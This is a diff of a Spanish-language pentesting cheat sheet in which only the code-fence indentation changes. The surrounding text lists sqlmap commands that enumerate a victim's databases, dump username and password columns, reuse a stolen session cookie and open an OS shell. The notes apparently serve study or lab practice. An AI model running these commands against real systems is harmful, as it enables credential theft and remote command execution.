@@ -522,7 +522,7 @@ scp username@hostname:/path/to/remote/file /path/to/local/file
 
     Eunumerar BD
 
-    ```bash
+```bash
     # Conocer las bases de datos.
 
     sqlmap -u 'http://<IP máquina víctima>' --forms --dbs --batch
@@ -538,25 +538,25 @@ scp username@hostname:/path/to/remote/file /path/to/local/file
     # Conocer la información que hay en esas columnas (ex: username,password)
 
     sqlmap -u 'http://<IP máquina víctima>' --forms -D Webapp -T Users -C username,password --dump --batch
-    ```
+```
 
     Para parametros que sabemos vulnerables
 
-    ```bash
+```bash
     sqlmap -u '<http://victim.site/view.php?id=1141>' -p id
-    ```
+```
 
     Cuando estamos autenticados como algún usuario,
 
-    ```bash
+```bash
     sqlmap -u '<http://victim.site/dashboard.php?search=1>' --cookie "PHPSESSID=a3tqcq298ggfth9njj2mgg6ch1"
-    ```
+```
 
     Para ejecutar comandos de sistema:
 
-    ```bash
+```bash
     sqlmap -u '<http://victim.site/dashboard.php?search=1>' --os-shell
-    ```
+```
 
 ### Enumeracion
 
